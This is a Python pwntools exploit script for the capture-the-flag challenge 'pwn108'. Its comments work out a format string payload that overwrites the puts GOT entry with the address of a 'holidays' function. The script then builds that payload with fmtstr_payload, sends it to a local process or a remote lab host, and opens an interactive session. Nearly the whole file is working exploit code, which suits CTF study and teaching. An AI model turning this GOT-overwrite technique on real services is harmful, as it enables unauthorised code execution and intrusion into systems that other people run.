#!/usr/bin/env python3

from pwn import *



#first entry is not a formatstr vuln; so we just send "foo" as name
#the second entry is a formatstr vuln; so we have to craft a payload to send 

#payload development:
#the plan is to overwrite the puts address with the holiday address.
#puts was selected because it printf is used in holiday function which would corrupt its run, however puts is not used in holiday so we can overwrite it without impacting the holidays function

#identify that the input is located at position 10; starting count at 0 using...
#AAAA.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.

#junkpayload = b"A"*0x12 which inputs into the first read

#payload = b"%40X12$nAAAAAAA" + p64(binary.gots.put)
# b"%32X10$n" prints 7 bytes

#0040123b is the address of holidays function.
#so we will write 40 into first part of puts; then 123b into second part of puts

#1st write = 0x40 which is 64 - which is really padding for byte count
#2nd write = 0x123b which is 4667 but minus the 1st write so 4667-64 = 4603
#payload = b"%64X%13$n" + b"%4603X%14$hnAAA" + p64(binary.gots.put+2) + p64(binary.gots.put)
# so 64X%13$n will write 0x40 fully at position puts+2
# and 4603X%14hn will write 0x123b half (due to the hn) at position puts

#so why 13 and 14?
#position 10 is overwritten with %64X%13$ - 8 bytes
#position 11 is overwritten with n%4603X% - 8 bytes
#position 12 is overwritten with 14$hnAAA - 8 bytes
#and then we reference the locations we want to overwrite
#stupidly complicated to figure by hand but that's the logic

#fortuneately pwntools can do all this for you as long as you have the first position for overwrite, i.e. 10 in this case 

binary = context.binary = ELF("./pwn108.pwn108", checksec=False)

if args.REMOTE:
    p = remote("10.10.142.177", 9008)
else:
    p = process(binary.path)

print(binary.got.puts)
print(binary.sym.holidays)
payload = fmtstr_payload(10, {binary.got.puts : binary.sym.holidays})
print(payload)
p.sendlineafter(b"=[Your name]: ", b"foo")
p.sendlineafter(b"=[Your Reg No]: ", payload)
null = payload.find(b"\x00")
p.recvuntil(payload[null-3:null])
p.interactive()

 

 
